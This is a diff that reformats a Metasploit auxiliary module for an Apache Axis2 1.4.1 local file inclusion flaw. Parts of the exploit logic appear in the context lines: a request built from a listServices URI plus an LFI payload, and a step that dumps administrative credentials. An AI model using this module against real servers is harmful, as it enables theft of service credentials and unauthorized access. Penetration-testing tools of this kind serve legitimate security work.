@@ -9,9 +9,7 @@
 # http://metasploit.com/framework/
 ##
 
-
 require 'msf/core'
-
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -24,26 +22,28 @@ class Metasploit3 < Msf::Auxiliary
 		super(
 			'Name'           => 'Apache Axis2 v1.4.1 Local File Inclusion',
 			'Version'        => '$Revision$',
-			'Description'    => %q{ This module exploits an Apache Axis2 v1.4.1 local file inclusion (LFI) vulnerability.
-			   By loading a local XML file which contains a cleartext username and password, attackers can trivially
-			   recover authentication credentials to Axis services.},
-			'References'		 => 
-			[
-				['URL', 'http://www.exploit-db.com/exploits/12721/'],
-				['OSVDB', '59001'],
-			],
-			'Author'         => [
-				'==[ Alligator Security Team ]==',
-				'Tiago Ferreira <tiago.ccna[at]gmail.com>'
-			],
+			'Description'    => %q{
+					This module exploits an Apache Axis2 v1.4.1 local file inclusion (LFI) vulnerability.
+				By loading a local XML file which contains a cleartext username and password, attackers can trivially
+			   recover authentication credentials to Axis services.
+			},
+			'References'     =>
+				[
+					['URL', 'http://www.exploit-db.com/exploits/12721/'],
+					['OSVDB', '59001'],
+				],
+			'Author'         =>
+				[
+					'==[ Alligator Security Team ]==',
+					'Tiago Ferreira <tiago.ccna[at]gmail.com>'
+				],
 			'License'        =>  MSF_LICENSE
 		)
 
-		register_options(
-			[ Opt::RPORT(8080),
-				OptString.new('URI', [false, 'The path to the Axis listServices', '/axis2/services/listServices']),
+		register_options([
+			Opt::RPORT(8080),
+			OptString.new('URI', [false, 'The path to the Axis listServices', '/axis2/services/listServices']),
 		], self.class)
-
 	end
 
 	def target_url
@@ -66,15 +66,15 @@ class Metasploit3 < Msf::Auxiliary
 				get_credentials(new_uri)
 
 			else
-				print_status("#{target_url} - Apache Axis - The remote page not acessible")	
-				return 
+				print_status("#{target_url} - Apache Axis - The remote page not acessible")
+				return
 
 			end
 
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
 		rescue ::Timeout::Error, ::Errno::EPIPE
 
-		end	
+		end
 	end
 
 	def get_credentials(uri)
@@ -86,7 +86,7 @@ class Metasploit3 < Msf::Auxiliary
 				'uri'     => "#{uri}" + lfi_payload,
 			}, 25)
 
-			print_status("#{target_url} - Apache Axis - Dumping administrative credentials")		
+			print_status("#{target_url} - Apache Axis - Dumping administrative credentials")
 
 			if (res and res.code == 200)
 				if res.body.to_s.match(/axisconfig/)
@@ -108,7 +108,7 @@ class Metasploit3 < Msf::Auxiliary
 					)
 
 				else
-					print_error("#{target_url} - Apache Axis - Not Vulnerable")			
+					print_error("#{target_url} - Apache Axis - Not Vulnerable")
 					return :abort
 				end
 
